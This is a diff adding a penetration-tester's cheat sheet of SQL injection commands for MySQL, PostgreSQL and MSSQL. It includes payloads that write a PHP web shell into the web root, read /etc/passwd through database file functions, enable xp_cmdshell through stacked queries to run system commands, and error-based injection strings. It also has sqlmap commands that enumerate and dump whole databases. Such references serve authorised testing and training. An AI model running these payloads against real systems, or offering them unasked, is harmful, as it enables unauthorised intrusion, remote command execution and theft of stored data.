@@ -1,0 +1,102 @@
+% sql
+
+# mysql postgres version
+select version();
+
+# mysql current user
+select current_user();
+
+# mysql database
+show databases;
+select table_schema from information_schema.tables group by table_schema;
+
+# mysql tables for database
+select table_name from information_schema.tables where table_schema = '<DB>';
+
+# mysql columns for table
+select column_name, data_type from information_schema.columns where table_schema = '<DB>' and table_name = '<TABLE>';
+
+# mysql query rows
+select <COL_OR_ASTERISK> from <DB>.<TABLE>;
+
+# mysql display one
+SELECT <COL_OR_ASTERISK> FROM <DB>.<TABLE> LIMIT 1;
+
+# mysql read write
+SELECT @@GLOBAL.secure_file_priv; -- default value /var/lib/mysql-files
+SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt;
+SELECT LOAD_FILE('/var/lib/mysql-files/test.txt');
+
+# mssql rce
+echo -n '<?php passthru($_GET["cmd"]); ?>' | xxd -ps
+3c3f70687020706173737468727528245f4745545b22636d64225d293b203f3e
+SELECT 0x3c3f70687020706173737468727528245f4745545b22636d64225d293b203f3e INTO OUTFILE "/var/www/html/shell.php"
+SELECT "<?php passthru($_GET['cmd']); ?>" INTO DUMPFILE '/var/www/html/shell.php';
+
+# postgres current user
+select current_user;
+
+# postgres database
+select datname from pg_database;
+
+# postgres table for database
+select table_name from <DB>.information_schema.tables where table_schema = 'public';
+
+# postgres columns for table
+select column_name, data_type from <DB>.information_schema.columns where table_name = '<TABLE>';
+
+# postgres query (public is default schema)
+select <COL> from <DB>.public.<TABLE>;
+
+# postgres read file ls
+select pg_read_file('/etc/passwd');
+select pg_ls_dir('./');
+CREATE TABLE temp(data TEXT);
+COPY temp FROM '/etc/passwd';
+SELECT * FROM temp limit 1 offset 0;
+
+# mssql error
+For integer inputs : convert(int,@@version)
+For integer inputs : cast((SELECT @@version) as int)
+For string inputs  : ' + convert(int,@@version) + '
+For string inputs  : ' + cast((SELECT @@version) as int) + '
+For ORDER BY	   : ,extractvalue('',concat('>',version()))
+
+# mssql enumerate display one
+SELECT name FROM sys.databases ORDER BY id OFFSET <INC> ROWS FETCH NEXT 1 ROWS ONLY
+SELECT TABLE_NAME FROM <DB>.information_schema.tables ORDER BY id OFFSET <INC> ROWS FETCH NEXT 1 ROWS ONLY
+SELECT SCHEMA_NAME FROM <DB>.information_schema.SCHEMATA ORDER BY id OFFSET <INC> ROWS FETCH NEXT 1 ROWS ONLY
+SELECT COLUMN_NAME FROM <DB>.information_schema.columns WHERE TABLE_NAME = '<TABLE>' ORDER BY id OFFSET <INC> ROWS FETCH NEXT 1 ROWS ONLY
+SELECT <COL> FROM <DB>.<SCHEMA>.<TABLE> ORDER BY id OFFSET <INC> ROWS FETCH NEXT 1 ROWS ONLY
+
+# mssql stacked queries rce
+test'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
+test'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
+test'; EXEC xp_cmdshell '<CMD>';--
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
+
+# sqlmap get
+sqlmap --purge -u 'http://<URL>?uname=test&psw=test' --time-sec=10
+
+# sqlmap post
+sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<URL>' --time-sec=10
+
+#sqlmap post test parameters
+sqlmap --purge -u "<URL>" -X POST --data "db=mysql&name=taco&sort=id&order=asc" -p "name,sort,order"
+
+# sqlmap dump all with backend type
+DB_TYPE = mysql, mssql, postgres, oracle
+sqlmap --purge -u "<URL>" -X POST --data "<POST_DATA>" --dbms=<DB_TYPE> --dump
+
+# sqlmap enumerate database
+sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<URL>'  -p "<DATA_PARAM>" --dbms=<DB_TYPE> --dbs
+
+# sqlmap enumerate tables
+sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<URL>' -p "<DATA_PARAM>" --dbms=<DB_TYPE> -D <DB> --tables
+
+# sqlmap enumerate columns
+sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<URL>' -p "<DATA_PARAM>" --dbms=<DB_TYPE> -D <DB> -T <TABLE> --columns
+
+# sqlmap dump specific
+sqlmap --purge -X POST --data "<DATA>" -H "Content-Type: <CONTENT_TYPE>" -u '<URL>' -p "<DATA_PARAM>" --dbms=<DB_TYPE> -D <DB> -T <TABLE> -C <COL1>,<COL2> --dump
